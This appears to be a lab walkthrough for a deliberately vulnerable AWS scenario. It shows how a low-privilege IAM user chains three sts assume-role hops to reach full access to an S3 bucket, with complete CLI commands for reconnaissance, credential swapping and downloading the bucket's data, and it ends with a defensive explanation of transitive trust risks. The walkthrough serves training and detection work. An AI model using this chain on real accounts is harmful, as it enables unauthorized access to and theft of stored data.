# Guided Walkthrough: role-chain-to-s3

This scenario demonstrates a simple 3-hop role assumption chain where each role can assume the next role in the chain, ultimately granting access to an S3 bucket. The chain also includes an IAM user that can directly assume the intermediate role.

A 3-hop role assumption chain in the production environment with an S3 bucket destination. An attacker starting from a user with only `sts:AssumeRole` permission can traverse three sequential role assumptions to reach a role that has full S3 access to the sensitive destination bucket.

This configuration is dangerous because the trust relationships between roles are individually innocuous — each role only trusts the one before it. However, when chained together, they form a complete privilege escalation path that is difficult to detect without analyzing the full transitive trust graph. CSPM tools that only analyze individual roles in isolation will miss this path entirely.

Role chains like this appear in real environments when IAM roles are created incrementally over time by different teams, or when roles are set up for cross-service delegation and the cumulative effect of chained trust policies is never reviewed holistically.

## The Challenge

You start as `pl-pathfinding-starting-user-prod`, an IAM user with minimal permissions — essentially just `sts:AssumeRole` and `sts:GetCallerIdentity`. Your goal is to reach the sensitive S3 bucket `pl-prod-role-chain-destination-{account_id}` and exfiltrate its contents.

The bucket is not directly accessible to you. It is only accessible via `pl-prod-s3-access-role`, which is itself only reachable by traversing a chain of role assumptions through `pl-prod-initial-role` and `pl-prod-intermediate-role`. Your challenge is to discover and traverse this chain.

There is also a second, shorter path: the IAM user `pl-prod-role-chain-user` can bypass the first hop and assume `pl-prod-intermediate-role` directly, giving you a two-hop path to the same target.

## Reconnaissance

First, let's confirm who we are and what we're working with:

```bash
aws sts get-caller-identity
```

With helpful permissions like `iam:ListRoles` and `iam:GetRole`, you can enumerate the account's roles and inspect their trust policies to discover the chain:

```bash
aws iam list-roles --query 'Roles[?starts_with(RoleName, `pl-prod`)].{Name: RoleName, Arn: Arn}'
```

For each role in the `pl-prod-` namespace, inspect its trust policy:

```bash
aws iam get-role --role-name pl-prod-initial-role --query 'Role.AssumeRolePolicyDocument'
aws iam get-role --role-name pl-prod-intermediate-role --query 'Role.AssumeRolePolicyDocument'
aws iam get-role --role-name pl-prod-s3-access-role --query 'Role.AssumeRolePolicyDocument'
```

You will find that `pl-prod-initial-role` trusts any principal in the prod account with `sts:AssumeRole`, that `pl-prod-intermediate-role` trusts `pl-prod-initial-role`, and that `pl-prod-s3-access-role` trusts `pl-prod-intermediate-role`. The chain is now visible.

## Exploitation

### Hop 1: Starting User to Initial Role

Assume `pl-prod-initial-role` using the starting user's credentials:

```bash
INITIAL_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{account_id}:role/pl-prod-initial-role" \
  --role-session-name "hop1" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $INITIAL_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $INITIAL_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $INITIAL_CREDS | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
```

You are now `pl-prod-initial-role`. This role has no sensitive permissions by itself, but it can assume the next role in the chain.

### Hop 2: Initial Role to Intermediate Role

Using the initial role's credentials, assume `pl-prod-intermediate-role`:

```bash
INTERMEDIATE_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{account_id}:role/pl-prod-intermediate-role" \
  --role-session-name "hop2" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $INTERMEDIATE_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $INTERMEDIATE_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $INTERMEDIATE_CREDS | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
```

You are now `pl-prod-intermediate-role`. Note that this role is also trusted by `pl-prod-role-chain-user`, meaning there are two distinct paths to this point in the chain.

### Hop 3: Intermediate Role to S3 Access Role

Using the intermediate role's credentials, assume `pl-prod-s3-access-role`:

```bash
S3_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{account_id}:role/pl-prod-s3-access-role" \
  --role-session-name "hop3" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $S3_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $S3_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $S3_CREDS | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
```

You are now `pl-prod-s3-access-role`, which holds `s3:GetObject`, `s3:PutObject`, `s3:DeleteObject`, and `s3:ListBucket` permissions on the destination bucket.

### Alternative Path: Chain User (2-hop)

The IAM user `pl-prod-role-chain-user` can skip Hop 1 entirely and assume `pl-prod-intermediate-role` directly:

```bash
# Configure credentials for pl-prod-role-chain-user, then:
INTERMEDIATE_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{account_id}:role/pl-prod-intermediate-role" \
  --role-session-name "hop1-chain2" \
  --output json)

# Continue from Hop 3 above
```

## Verification

With `pl-prod-s3-access-role` credentials active, confirm you can access the sensitive bucket:

```bash
# List bucket contents
aws s3 ls s3://pl-prod-role-chain-destination-{account_id}/

# Download a sensitive file
aws s3 cp s3://pl-prod-role-chain-destination-{account_id}/sensitive-data.txt .
```

Successful output from `s3 ls` confirms you have traversed the full role chain and achieved your objective.

## What Happened

You exploited a three-hop transitive role trust chain. Each individual trust relationship was innocuous in isolation — `pl-prod-initial-role` simply trusted account users, the intermediate role trusted only one specific role, and the S3 access role trusted only the intermediate role. No single role appeared overly permissive on its own.

However, when composed together, these trust relationships formed a complete privilege escalation path from a low-privilege starting user to full read/write access on a sensitive S3 bucket. This is a common pattern in real environments where IAM roles accumulate over time across teams and services, and the transitive effects of chained trust policies are never reviewed holistically. CSPM tools that analyze roles in isolation rather than performing graph traversal will miss this class of vulnerability entirely.
